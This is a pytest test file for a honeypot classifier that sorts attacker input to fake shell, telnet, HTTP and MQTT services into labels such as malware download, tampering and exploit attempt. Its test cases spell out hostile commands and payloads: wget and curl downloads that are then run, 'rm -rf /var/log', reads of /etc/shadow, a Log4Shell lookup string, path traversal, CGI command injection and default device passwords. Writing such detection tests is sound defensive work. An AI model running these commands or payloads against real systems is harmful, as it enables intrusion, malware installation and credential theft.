import pytest

from analyzer.classifier import RISK_LEVELS, classify_input, rule_based_classify


@pytest.mark.parametrize(
    ("service", "text", "expected"),
    [
        ("fake_shell", "wget http://1.2.3.4/bot.sh", "malware_download_attempt"),
        ("fake_shell", "cd /tmp; curl -O http://x/y; chmod 777 y; ./y", "malware_download_attempt"),
        ("fake_telnet", "/bin/busybox tftp -g -r arm7 1.2.3.4", "malware_download_attempt"),
        ("fake_shell", "rm -rf /var/log", "system_tampering"),
        ("fake_shell", "cat /etc/shadow", "system_tampering"),
        ("fake_shell", "cat /etc/passwd", "reconnaissance"),
        ("fake_shell", "uname -a", "reconnaissance"),
        ("fake_shell", "id", "reconnaissance"),
        ("fake_shell", "ls -la", "reconnaissance"),
        ("fake_telnet", "login_attempt username=root password=xc3511", "credential_attack"),
        ("http", "login_attempt username=admin password=admin path=/login", "credential_attack"),
        ("http", "GET /phpmyadmin", "web_admin_scan"),
        ("http", "GET /.env", "web_admin_scan"),
        ("http", "GET /cgi-bin/../../etc/passwd", "exploit_attempt"),
        ("http", "GET /search?q=${jndi:ldap://x/a}", "exploit_attempt"),
        ("http", "GET /setup.cgi?cmd=;wget http://x/y", "exploit_attempt"),
        ("fake_mqtt", "connect protocol=MQTT/4 client_id=scan", "mqtt_probe"),
        ("fake_mqtt", "subscribe topic=#", "mqtt_probe"),
        ("fake_mqtt", "connect client_id=a username=admin password=public", "credential_attack"),
    ],
)
def test_rules(service, text, expected):
    result = classify_input(text, service=service)
    assert result.classification == expected
    assert result.risk_level == RISK_LEVELS[expected]


@pytest.mark.parametrize("text", ["android", "tools", "video", "hidden", "robots"])
def test_no_substring_false_positives(text):
    # The old classifier matched "id" inside "android" and "ls" inside "tools".
    assert rule_based_classify(text, service="fake_shell") is None


def test_empty_input():
    assert classify_input("", service="http").classification == "empty_or_unknown"
    assert classify_input("   ", service="fake_shell").classification == "empty_or_unknown"


def test_harmless_requests_are_low_risk():
    assert classify_input("GET /", service="http").risk_level == "low"
    assert classify_input("GET /favicon.ico", service="http").risk_level == "low"


def test_huge_input_is_handled():
    result = classify_input("A" * 1_000_000, service="fake_shell")
    assert result.classification in RISK_LEVELS


def test_every_label_has_a_risk_level():
    from analyzer.classifier import TRAINING_SAMPLES

    assert {label for _, label in TRAINING_SAMPLES} <= set(RISK_LEVELS)


@pytest.mark.parametrize("text", ["exit", "help", "enable", "sh", "QUIT"])
def test_shell_housekeeping_is_not_an_attack(text):
    result = classify_input(text, service="fake_telnet")
    assert (result.classification, result.risk_level) == ("general_probe", "low")
